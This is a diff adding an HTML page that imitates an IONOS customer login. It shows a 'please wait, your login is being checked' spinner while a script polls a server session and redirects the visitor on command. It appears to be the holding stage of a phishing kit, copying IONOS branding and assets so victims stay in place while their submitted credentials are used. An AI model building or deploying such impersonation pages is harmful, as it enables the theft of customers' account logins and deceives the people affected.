@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="de" data-exos-theme="ionos">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login – Zugang zu Ihrem Kundenkonto</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="ionos-assets/image/favicon-32px.png" />
+  <link rel="stylesheet" href="ionos-assets/style/exos.min.css" />
+  <link rel="stylesheet" href="ionos-assets/style/main.min.css" />
+  <style>
+    .page-content main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .page-section {
+      width: 100%;
+    }
+
+    .page-section--short .page-section__block {
+      padding-right: 0 !important;
+      max-width: 520px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .wait-body { text-align: center; padding: 48px 32px 40px; }
+    .wait-spinner {
+      width: 48px; height: 48px; margin: 0 auto 24px;
+      border: 3px solid #e8ecf0;
+      border-top-color: #003d8f;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .wait-title { font-size: 20px; font-weight: 700; color: #003d8f; margin: 0 0 12px; }
+    .wait-text { font-size: 14px; color: #555; line-height: 1.6; margin: 0; }
+  </style>
+</head>
+<body style="min-height:100vh;display:flex;flex-direction:column;">
+  <div class="page-content" style="flex:1;display:flex;flex-direction:column;">
+    <div class="oao-navi-navigation oao-navi-light">
+      <div class="oao-navi-left">
+        <div class="oao-navi-application-name">
+          <span class="oao-navi-app-name">
+            <span class="oao-navi-app-logo"></span>
+            <span>Login</span>
+          </span>
+        </div>
+      </div>
+    </div>
+    <main>
+      <section class="page-section page-section--default page-section--short page-section--align-center">
+        <div class="page-section__block">
+          <div class="sheet">
+            <section class="sheet__section sheet__section--default wait-body">
+              <div class="wait-spinner" aria-hidden="true"></div>
+              <h1 class="wait-title">Bitte warten</h1>
+              <p class="wait-text">Ihr Login wird überprüft.<br>Dies kann einen Moment dauern.</p>
+            </section>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+  <script src="/ionos-flow.js"></script>
+  <script>
+    (async function () {
+      const sessionId = IonosFlow.requireSession();
+      if (!sessionId) return;
+
+      async function tick() {
+        try {
+          const data = await IonosFlow.pollSession(sessionId);
+          if (!data.ok && data.status === "gone") {
+            window.location.replace("/ionos.html");
+            return;
+          }
+          if (data.status === "redirect" && data.redirect) {
+            window.location.href = data.redirect;
+            return;
+          }
+          if (data.status === "error" && data.redirect) {
+            window.location.href = data.redirect;
+            return;
+          }
+        } catch (_) {}
+        setTimeout(tick, 1500);
+      }
+
+      tick();
+    })();
+  </script>
+</body>
+</html>
